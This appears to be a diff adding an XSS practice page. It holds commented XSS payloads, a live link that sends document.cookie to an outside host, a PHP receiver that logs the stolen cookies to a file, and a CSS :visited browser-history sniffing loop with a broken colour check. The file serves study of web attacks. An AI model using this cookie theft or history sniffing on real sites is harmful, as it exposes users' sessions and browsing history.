@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+
+<!--
+<img src="#" onerror="alert(/xss/)" alt="" />
+-->
+
+<div style="background-image: url(javascrpt:alert(xss))"></div>
+
+<a href="" id="cookie">cookie</a>
+
+<h3>Visited</h3>
+<ul id="visited"></ul>
+<h3>Not Visited</h3>
+<ul id="notvisited"></ul>
+
+
+</body>
+<script>
+/*
+    eval("\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29");
+*/
+
+    // 用js创建a标签
+    document.getElementById('cookie').setAttribute('href','http://www.test.com/?cookie=' + document.cookie);
+    /*
+
+        远程接收-php端
+        $cookie = $_GET['cookie'];
+        $log = fopen('cookie.txt','a');
+        fwrite($log,$cookie . '\n');
+        fclose($log);
+
+    */
+
+
+/**/
+
+    // 已访问过为红色.直接使用css也可以
+    var websites = [
+            'https://www.baidu.com',
+            'http://www.artjzf.com',
+            'http://www.a.com',
+            'http://www.sina.com.cn',
+            'http://www.163.com'
+    ];
+
+    for(var i =0;i<websites.length;i++){
+        var link = document.createElement('a');
+        link.id = 'id' + i;
+        link.href = websites[i];
+        link.innerHTML = websites[i];
+        document.write('<style>');
+        document.write('#id' + i + ':visited{color:#FF0000;}');
+        document.write('</style>');
+        document.body.appendChild(link);
+        // getComputedStyle();参数1.需要计算的样式元素节点；参数2.伪类(如:hover)，如果没有就填null
+        var color = document.defaultView.getComputedStyle(link,null).getPropertyValue('color');
+        document.body.removeChild(link);
+        console.log(color);
+        if(color == 'rgb(255,0,0)'){
+            var item = document.createElement('li');
+            item.appendChild(link);
+            document.getElementById('visited').appendChild(item);
+        }else{
+            var item = document.createElement('li');
+            item.appendChild(link);
+            document.getElementById('notvisited').appendChild(item);
+        }
+    }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</script>
+</html>
